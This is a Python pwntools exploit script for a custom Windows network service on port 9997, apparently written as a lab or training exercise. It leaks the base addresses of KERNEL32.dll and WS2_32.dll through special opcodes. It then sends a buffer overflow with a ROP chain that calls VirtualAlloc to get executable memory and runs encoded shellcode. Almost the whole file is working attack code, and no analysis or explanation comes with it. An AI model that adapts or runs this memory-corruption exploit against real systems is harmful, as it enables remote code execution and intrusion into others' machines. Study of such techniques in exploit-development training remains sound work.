from pwn import *

host = '192.168.1.8'
port = 9997
bigData = ''


def parseAddress(data, dll):

    pattern = b'[+]'
    address = 0

    address = int(data.split(pattern)[3].split(b':')[1].strip(), 16)
    print(address)

    global bigData
    bigData += f"[+] Address of {dll.decode()}: {hex(address)}\n"

    return address


def leakAddress(dll, opcode):

    size = 4096
    data = b''
    address = 0


    buf  = b''
    buf += p32(0xdeadbeef)
    buf += p32(0xc0decafe)
    buf += p32(0xd0d0face)
    buf += p32(0x41414141)
    buf += p32(0x42424242)
    buf += p32(0x43434343)
    buf += p32(0x44444444)
    buf += p32(opcode)
    buf += dll
    buf += b'A' * (size - len(buf) - 1)

    io = remote(host, port)
    data = io.recv(1024)
    io.send(buf)
    data += io.recv(1024)
    data += io.recv(1024)
    io.close()

    address = parseAddress(data, dll)

    return address


def doOverflow(opcode, ws2Address, kernel32Address):
    
    size = 4096
    offset = 2512


    va  = b''
    va += p32(kernel32Address + 0x0001f9f0) # VirtualAlloc address
    va += p32(0x45454545)   # Shellcode return address
    va += p32(0x46464646)   # lpBaseAddress
    va += p32(0x400)        # dwSize
    va += p32(0x1000)       # flAllocationType | MEM_COMMIT , MEM_RESERVE
    va += p32(0x40)         # flProtect RWX


    rop  = b''
    # Shellcode return address
    rop += p32(kernel32Address + 0x0005201f)    # mov eax, esi; pop esi; pop ebp; retn 0x4
    rop += b'A' * 8                             # junk
    rop += p32(ws2Address + 0x00008b57)         # pop ebp; ret
    rop += b'A' * 4                             # junk for retn 0x4
    rop += p32(0xffffffe8)                      # -24 to first artgument of va
    rop += p32(kernel32Address + 0x00044884)    # add eax, ebp; ret
    rop += p32(ws2Address + 0x00017572)         # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x000668da)    # xchg eax, edx; ret
    rop += p32(ws2Address + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0x000000bc)                      # value to shellcode
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(ws2Address + 0x00017572)         # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x0002325d)    # mov [edx], eax; mov eax, 3; ret

    #lpBaseAddress
    rop += p32(kernel32Address + 0x24e49)       # inc edx, add al, 0xc3, mov eax, 0xff; ret
    rop += p32(kernel32Address + 0x24e49)       # inc edx, add al, 0xc3, mov eax, 0xff; ret
    rop += p32(kernel32Address + 0x24e49)       # inc edx, add al, 0xc3, mov eax, 0xff; ret
    rop += p32(kernel32Address + 0x24e49)       # inc edx, add al, 0xc3, mov eax, 0xff; ret
    rop += p32(ws2Address + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x0002325d)    # mov [edx], eax; mov eax, 3; ret

    # flAllocationType
    rop += p32(ws2Address + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0xffffff44)                      # random value
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0x00000008)                      # go to flAllocationType - 4 argument
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(kernel32Address + 0x20148)       # pop ebx; ret
    rop += p32(0x1000)                          # MEM_COMMIT | MEM_RESERVE
    rop += p32(kernel32Address + 0x00039083)    # mov [eax+4], ebx; ret

    # Jump to VirtualAlloc
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0xfffffff0)                      # go to virtualalloc - 4 argument
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(kernel32Address + 0x0005211a)    # xchg eax,ebp; ret
    rop += p32(kernel32Address + 0x00020566)    # mov esp,ebp; pop ebp; ret


    shellcode  = b''
    shellcode += b"\x90" * 30
    shellcode += b"\xeb\x23\x5b\x89\xdf\xb0\xaf\xfc\xae\x75\xfd"
    shellcode += b"\x89\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81"
    shellcode += b"\x3f\xd0\xc4\x74\x08\x46\x80\x3e\xaf\x75\xee"
    shellcode += b"\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x32\x12"
    shellcode += b"\x02\xaf\xce\xfa\x80\x32\x12\x02\x52\x9b\xe7"
    shellcode += b"\x03\xd2\x66\xb9\x42\x32\xb9\x40\x0e\xb9\x40"
    shellcode += b"\x16\xb9\x60\x2a\x3d\xa5\x48\x14\x23\xfd\x9e"
    shellcode += b"\x2e\x63\x4e\x10\x2e\x12\xd3\xcd\x3f\x13\xc5"
    shellcode += b"\xd0\xe0\x50\x65\x99\x50\x22\x99\x48\x0e\x99"
    shellcode += b"\x4e\x23\x6a\xe1\x7a\x13\xd3\x63\x99\x5b\x12"
    shellcode += b"\x13\xd1\xb9\x5b\x1a\xd1\x28\x4b\xb9\x26\x89"
    shellcode += b"\x33\xc4\x33\xcd\xbe\xc3\xfd\x1f\x03\xf5\x2a"
    shellcode += b"\xe2\x47\xe4\x01\x4f\xea\x39\x4f\x36\x77\xd6"
    shellcode += b"\x4a\x89\x6a\x36\x03\xe1\x74\x89\x3e\x59\x89"
    shellcode += b"\x6a\x0e\x03\xe1\x99\x06\xb9\x13\xd2\xbb\x56"
    shellcode += b"\x26\x16\x49\x59\x53\x4b\x58\x63\xed\xe2\x6d"
    shellcode += b"\x4d\x58\xb9\x00\xe9\xbf\x4f\x68\x33\x9f\x87"
    shellcode += b"\x80\x12\x02\x32\x42\x6a\x03\x99\x6d\xb5\xed"
    shellcode += b"\xd7\x89\xe2\xb7\x90\x44\x6a\x94\x87\xbf\xaf"
    shellcode += b"\xed\xd7\x0e\x14\x7e\x38\x92\xf9\xd2\x67\x07"
    shellcode += b"\x89\x55\x11\x40\x7d\x68\x32\x41\xfd\xe7\x71"
    shellcode += b"\x63\x5e\x71\x2c\x57\x6a\x67\x32\xd0\xc4"
    shellcode += b'\x90' * (400 - len(shellcode))


    buf  = b''
    buf += p32(0xdeadbeef)
    buf += p32(0xc0decafe)
    buf += p32(0xd0d0face)
    buf += p32(0x41414141)
    buf += p32(0x42424242)
    buf += p32(0x43434343)
    buf += p32(0x44444444)
    buf += p32(opcode)
    buf += b'A' * (offset - len(buf) - len(va))
    buf += va
    buf += p32(kernel32Address + 0x0006e6dd)    # push esp; pop esi; ret
    buf += rop
    buf += shellcode
    buf += b'A' * (size - len(buf) - 1)

    io = remote(host, port)
    io.recv(1024)
    io.send(buf)
    io.recv(1024)
    io.close()


def main():

    mainAddress = leakAddress(b'main', 900)
    ws2Address = leakAddress(b'WS2_32.dll', 902)
    kernel32Address = leakAddress(b'KERNEL32.dll', 901)
    
    print(bigData)

    # badchars: {0x0a, 0x0b, 0x0c, 0x0d, 0xa1, 0xa2, 0xa3, 0xa4, 0xb1, 0xb2, 0xb3, 0xb4, 0xf1, 0xf2, 0xf3, 0xf4};

    doOverflow(903, ws2Address, kernel32Address)


if __name__ == '__main__':
    main()
